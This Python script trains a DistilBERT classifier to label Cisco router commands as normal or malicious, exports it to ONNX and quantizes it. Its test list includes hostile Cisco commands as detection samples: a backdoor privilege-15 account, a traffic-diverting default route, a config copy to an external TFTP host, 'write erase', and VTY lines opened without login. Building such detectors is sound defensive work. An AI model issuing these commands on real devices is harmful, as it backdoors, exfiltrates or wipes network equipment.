import torch
import json
import warnings
warnings.filterwarnings("ignore", category=FutureWarning)
import numpy as np
from datasets import Dataset
from transformers import (
    AutoTokenizer,
    AutoModelForSequenceClassification,
    TrainingArguments,
    Trainer,
    DataCollatorWithPadding,
    pipeline
)
import evaluate

# --- 1. SETUP ---
MODEL_NAME = "distilbert-base-uncased"
OUTPUT_DIR = "./models/distilbert-cisco-model"
ONNX_PATH  = "./models/distilbert-cisco-onnx"
DATA_PATH  = "./data/cisco_commands.json"

id2label = {0: "NORMAL", 1: "MALICIOUS"}
label2id = {"NORMAL": 0, "MALICIOUS": 1}

# --- 2. DATA PREP ---
print("--- Loading Cisco Command Dataset ---")
with open(DATA_PATH, "r") as f:
    raw_data = json.load(f)

dataset = Dataset.from_list(raw_data)
dataset = dataset.shuffle(seed=42)
split   = dataset.train_test_split(test_size=0.2, seed=42)
train_dataset = split["train"]
test_dataset  = split["test"]

normal_count   = sum(1 for x in raw_data if x["label"] == 0)
malicious_count= sum(1 for x in raw_data if x["label"] == 1)
print(f"Train: {len(train_dataset)}, Test: {len(test_dataset)}")
print(f"Dataset: {normal_count} normal, {malicious_count} malicious")

# --- 3. TOKENIZATION ---
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)

def tokenize_function(examples):
    # Cisco commands tend to be short; 128 tokens is plenty
    return tokenizer(examples["text"], truncation=True, max_length=128)

tokenized_train = train_dataset.map(tokenize_function, batched=True)
tokenized_test  = test_dataset.map(tokenize_function, batched=True)
data_collator   = DataCollatorWithPadding(tokenizer=tokenizer)

# --- 4. MODEL ---
model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_NAME,
    num_labels=2,
    id2label=id2label,
    label2id=label2id
)

# --- 5. METRICS ---
accuracy_metric = evaluate.load("accuracy")

def compute_metrics(eval_pred):
    logits, labels = eval_pred
    predictions = np.argmax(logits, axis=-1)
    return accuracy_metric.compute(predictions=predictions, references=labels)

# --- 6. TRAINING ---
training_args = TrainingArguments(
    output_dir=OUTPUT_DIR,
    per_device_train_batch_size=8,
    num_train_epochs=5,
    eval_strategy="epoch",
    save_strategy="epoch",
    load_best_model_at_end=True,
    metric_for_best_model="accuracy",
    logging_steps=10,
    learning_rate=2e-5,
    weight_decay=0.01,
    dataloader_pin_memory=torch.cuda.is_available(),  # True on GPU, False on CPU-only
)

trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=tokenized_train,
    eval_dataset=tokenized_test,
    tokenizer=tokenizer,
    data_collator=data_collator,
    compute_metrics=compute_metrics,
)

print("--- Starting Training ---")
trainer.train()
trainer.save_model(OUTPUT_DIR)
print(f"Model saved to {OUTPUT_DIR}")

# --- 7. ONNX EXPORT ---
# NOTE: Do NOT use --optimize O2/O3/O4. Those flags introduce Microsoft-specific
# ops (SkipLayerNormalization, FastGelu) unsupported by most ONNX runtimes (hugot, etc.)
print("--- Exporting to ONNX ---")
onnx_export_ok = False
try:
    import subprocess
    subprocess.run([
        "optimum-cli", "export", "onnx",
        "--model", OUTPUT_DIR,
        "--task", "text-classification",
        ONNX_PATH
    ], check=True)
    print(f"ONNX model exported to {ONNX_PATH}")
    onnx_export_ok = True
except Exception as e:
    print(f"ONNX export skipped: {e}")

if onnx_export_ok:
    print("--- Quantizing ONNX model to int8 ---")
    try:
        from optimum.onnxruntime import ORTQuantizer
        from optimum.onnxruntime.configuration import AutoQuantizationConfig
        quantizer = ORTQuantizer.from_pretrained(ONNX_PATH)
        qconfig   = AutoQuantizationConfig.avx512_vnni(is_static=False, per_channel=False)
        quantizer.quantize(save_dir=ONNX_PATH + "-int8", quantization_config=qconfig)
        print(f"Quantized model saved to {ONNX_PATH}-int8")
    except Exception as e:
        print(f"Quantization skipped: {e}")

# --- 8. INFERENCE TEST ---
print("\n--- Testing Cisco Command Classifier ---")
pipe = pipeline("text-classification", model=OUTPUT_DIR, tokenizer=tokenizer)

test_commands = [
    # Normal
    "show ip route",
    "show interfaces GigabitEthernet0/0",
    "copy running-config startup-config",
    "interface GigabitEthernet0/0\n ip address 192.168.1.1 255.255.255.0\n no shutdown",
    "router ospf 1\n network 192.168.0.0 0.0.255.255 area 0",
    # Malicious
    "username backdoor privilege 15 secret H@ck3d!pass",
    "ip route 0.0.0.0 0.0.0.0 185.220.101.1",
    "copy running-config tftp://10.99.0.1/stolen-config.cfg",
    "write erase",
    "line vty 0 4\n transport input all\n no login",
    "snmp-server community public RW",
    "ip access-list extended ACL_INBOUND\n permit ip any any",
]

print(f"\n{'Command':<65} {'Prediction':<12} {'Score'}")
print("-" * 90)
for cmd in test_commands:
    display = cmd.replace("\n", " | ")[:63]
    result  = pipe(cmd)[0]
    print(f"{display:<65} {result['label']:<12} {result['score']:.4f}")
